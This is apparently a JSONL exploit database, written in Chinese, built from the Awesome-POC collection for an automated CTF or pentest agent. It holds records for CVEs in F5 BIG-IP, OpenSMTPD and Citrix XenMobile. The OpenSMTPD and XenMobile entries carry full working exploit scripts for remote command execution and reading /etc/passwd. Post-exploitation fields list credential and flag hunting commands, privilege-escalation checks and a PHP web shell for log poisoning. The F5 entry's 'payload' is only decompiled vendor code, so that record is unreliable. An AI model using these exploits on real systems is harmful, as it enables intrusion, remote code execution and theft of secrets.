{"id": "awesome-poc:cve-2020-5902", "kind": "poc", "title": "F5 BIG-IP 远程代码执行漏洞 CVE-2020-5902", "technique": "rce", "summary": "Web应用漏洞 / CVE-2020-5902。载荷取自 Awesome-POC 的复现段落，已按实例值参数化。", "preconditions": ["目标产品与版本需落在 CVE-2020-5902 的影响范围内（先确认版本，再发载荷）", "载荷中的 {{host}} / {{target_url}} 按实际目标替换"], "target_stack": ["Web应用漏洞", "CVE-2020-5902"], "payload_template": "if (\"POST\".equalsIgnoreCase(request.getMethod())) {\n            String[] cmdArray = command.split(\" \");\n            String operation = cmdArray[0];\n            String module = cmdArray[2];\n            if (!ShellCommandValidator.checkForBadShellCharacters(command) && (operation.equals(\"create\") || operation.equals(\"delete\") || operation.equals(\"list\") || operation.equals(\"modify\")) && WHITELISTED_TMSH_MODULES.contains(module)) {\n               try {\n                  String[] args = new String[]{command};\n                  Result result = Syscall.callElevated(Syscall.TMSH, args);\n                  output = result.getOutput();\n                  error = result.getError();\n               } catch (CallException var11) {\n                  logger.error(NLSEngine.getString(\"ilx.workspace.error.TmshCommandFailed\") + \": \" + var11.getMessage());\n                  error = var11.getMessage();\n               }\n            } else {\n               error = NLSEngine.getString(\"ilx.workspace.error.RejectedTmshCommand\");\n}", "verification_method": ["按 payload 原样发送；命中判据是响应出现该 CVE 的预期特征（回显、报错或读到的文件内容）。", "第一次没有预期响应时换下一条载荷，不要在同一句上反复微调。"], "known_failures": ["机制导入，从未在本平台靶机上验证过；版本不符时不会生效。"], "steps": ["确认目标版本在 CVE-2020-5902 影响范围内", "把 payload 中的占位符换成实际目标", "发送并把响应与预期特征比对"], "post_exploitation": ["先读进程环境再翻文件：`printenv | grep -i -e flag -e ctf -e key` —— 多数镜像把 flag 导出到 web 进程环境，这一步最快。", "环境为空就按内容搜而非名字：`grep -rIl -e 'CTF{' -e 'flag{' /var/www /srv /opt /tmp /usr/local /home 2>/dev/null` —— 文件名常是 fl4g/f1ag 或无提示名。", "仍为空就判断能否提权：`id; sudo -l; find / -perm -4000 -type f 2>/dev/null; cat /proc/version`；`/root` 常 0700、`/proc/1/environ` 常 0400，读不到就是读不到。"], "provenance": {"source_type": "reference-corpus", "source_ref": "awesome-poc", "source_url": "https://github.com/Threekiii/Awesome-POC", "notes": "提取自 Web应用漏洞/F5 BIG-IP 远程代码执行漏洞 CVE-2020-5902.md 的复现段落"}, "trust_level": "unverified", "verified_solve": false, "published_at": null}
{"id": "awesome-poc:cve-2020-7247:2", "kind": "poc", "title": "OpenSMTPD 远程命令执行漏洞 CVE-2020-7247", "technique": "rce", "summary": "中间件漏洞 / CVE-2020-7247。载荷取自 Awesome-POC 的复现段落，已按实例值参数化。", "preconditions": ["目标产品与版本需落在 CVE-2020-7247 的影响范围内（先确认版本，再发载荷）", "载荷中的 {{host}} / {{target_url}} 按实际目标替换"], "target_stack": ["中间件漏洞", "CVE-2020-7247"], "payload_template": "# Exploit Title: OpenSMTPD 6.6.1 - Remote Code Execution\n# Date: 2020-01-29\n# Exploit Author: 1F98D\n# Original Author: Qualys Security Advisory\n# Vendor Homepage: https://www.opensmtpd.org/\n# Software Link: https://github.com/OpenSMTPD/OpenSMTPD/releases/tag/6.6.1p1\n# Version: OpenSMTPD < 6.6.2\n# Tested on: Debian 9.11 (x64)\n# CVE: CVE-2020-7247\n# References:\n# https://www.openwall.com/lists/oss-security/2020/01/28/3\n#\n# OpenSMTPD after commit a8e222352f and before version 6.6.2 does not adequately\n# escape dangerous characters from user-controlled input. An attacker\n# can exploit this to execute arbitrary shell commands on the target.\n# \n#!/usr/local/bin/python3\n\nfrom socket import *\nimport sys\n\nif len(sys.argv) != 4:\n    print('Usage {} <target ip> <target port> <command>'.format(sys.argv[0]))\n    print(\"E.g. {} {{target_url}} 25 'touch /tmp/x'\".format(sys.argv[0]))\n    sys.exit(1)\n\nADDR = sys.argv[1]\nPORT = int(sys.argv[2])\nCMD = sys.argv[3]\n\ns = socket(AF_INET, SOCK_STREAM)\ns.connect((ADDR, PORT))\n\nres = s.recv(1024)\nif 'OpenSMTPD' not in str(res):\n    print('[!] No OpenSMTPD detected')\n    print('[!] Received {}'.format(str(res)))\n    print('[!] Exiting...')\n    sys.exit(1)\n\nprint('[*] OpenSMTPD detected')\ns.send(b'HELO x\\r\\n')\nres = s.recv(1024)\nif '250' not in str(res):\n    print('[!] Error connecting, expected 250')\n    print('[!] Received: {}'.format(str(res)))\n    print('[!] Exiting...')\n    sys.exit(1)\n\nprint('[*] Connected, sending payload')\ns.send(bytes('MAIL FROM:<;{};>\\r\\n'.format(CMD), 'utf-8'))\nres = s.recv(1024)\nif '250' not in str(res):\n    print('[!] Error sending payload, expected 250')\n    print('[!] Received: {}'.format(str(res)))\n    print('[!] Exiting...')\n    sys.exit(1)\n\nprint('[*] Payload sent')\ns.send(b'RCPT TO:<root>\\r\\n')\ns.recv(1024)\ns.send(b'DATA\\r\\n')\ns.recv(1024)\ns.send(b'\\r\\nxxx\\r\\n.\\r\\n')\ns.recv(1024)\ns.send(b'QUIT\\r\\n')\ns.recv(1024)\nprint('[*] Done')", "verification_method": ["按 payload 原样发送；命中判据是响应出现该 CVE 的预期特征（回显、报错或读到的文件内容）。", "第一次没有预期响应时换下一条载荷，不要在同一句上反复微调。"], "known_failures": ["机制导入，从未在本平台靶机上验证过；版本不符时不会生效。"], "steps": ["确认目标版本在 CVE-2020-7247 影响范围内", "把 payload 中的占位符换成实际目标", "发送并把响应与预期特征比对"], "post_exploitation": ["先读进程环境再翻文件：`printenv | grep -i -e flag -e ctf -e key` —— 多数镜像把 flag 导出到 web 进程环境，这一步最快。", "环境为空就按内容搜而非名字：`grep -rIl -e 'CTF{' -e 'flag{' /var/www /srv /opt /tmp /usr/local /home 2>/dev/null` —— 文件名常是 fl4g/f1ag 或无提示名。", "仍为空就判断能否提权：`id; sudo -l; find / -perm -4000 -type f 2>/dev/null; cat /proc/version`；`/root` 常 0700、`/proc/1/environ` 常 0400，读不到就是读不到。"], "provenance": {"source_type": "reference-corpus", "source_ref": "awesome-poc", "source_url": "https://github.com/Threekiii/Awesome-POC", "notes": "提取自 中间件漏洞/OpenSMTPD 远程命令执行漏洞 CVE-2020-7247.md 的复现段落"}, "trust_level": "unverified", "verified_solve": false, "published_at": null}
{"id": "awesome-poc:cve-2020-8209", "kind": "poc", "title": "Citrix XenMobile 任意文件读取 CVE-2020-8209", "technique": "path-traversal", "summary": "Web应用漏洞 / CVE-2020-8209。载荷取自 Awesome-POC 的复现段落，已按实例值参数化。", "preconditions": ["目标产品与版本需落在 CVE-2020-8209 的影响范围内（先确认版本，再发载荷）", "载荷中的 {{host}} / {{target_url}} 按实际目标替换"], "target_stack": ["Web应用漏洞", "CVE-2020-8209"], "payload_template": "#!/usr/bin/python3\n#-*- coding:utf-8 -*-\n# author : PeiQi\n# from   : http://wiki.peiqi.tech\n\nimport hashlib\nimport sys\nimport requests\nimport random\nimport re\nimport urllib3\n\ndef title():\n    print('+------------------------------------------')\n    print('+  \\033[34mVersion: Citrix XenMobile                                          \\033[0m')\n    print('+  \\033[36m使用格式: python3 CVE-2020-8209.py                                  \\033[0m')\n    print('+  \\033[36mUrl    >>> http://xxx.xxx.xxx.xxx                                 \\033[0m')\n    print('+------------------------------------------')\n\ndef POC_1(target_url):\n    vuln_url = target_url + \"/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd\"\n    headers = {\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\"\n    }\n    try:\n        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10)\n        print(\"\\033[32m[o] 含有CVE-2020-8209漏洞，成功读取/etc/passwd\\033[0m\\n{} \".format(response.text))\n    except:\n        print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\")\n\n\n\nif __name__ == '__main__':\n    title()\n    target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >\t\t>> \\033[0m\"))\n    POC_1(target_url)", "verification_method": ["按 payload 原样发送；命中判据是响应出现该 CVE 的预期特征（回显、报错或读到的文件内容）。", "第一次没有预期响应时换下一条载荷，不要在同一句上反复微调。"], "known_failures": ["机制导入，从未在本平台靶机上验证过；版本不符时不会生效。"], "steps": ["确认目标版本在 CVE-2020-8209 影响范围内", "把 payload 中的占位符换成实际目标", "发送并把响应与预期特征比对"], "post_exploitation": ["先确认读得通：`/etc/passwd` 能出内容再往下，否则换编码（`..%2f`、`..%252f`、`....//`）。", "直接冲 flag 的常见位置：`/flag`、`/flag.txt`、`/tmp/flag`、`/root/flag`、`/home/*/flag`，以及应用目录下的 `config.php`/`.env`（里面有 DB 口令，可转 SQLi 或登录后台）。", "读不到就用日志投毒转 RCE：把 `<?php system($_GET[c]);?>` 写进 `access.log`，再 `?file=/var/log/apache2/access.log&c=id`。"], "provenance": {"source_type": "reference-corpus", "source_ref": "awesome-poc", "source_url": "https://github.com/Threekiii/Awesome-POC", "notes": "提取自 Web应用漏洞/Citrix XenMobile 任意文件读取 CVE-2020-8209.md 的复现段落"}, "trust_level": "unverified", "verified_solve": false, "published_at": null}
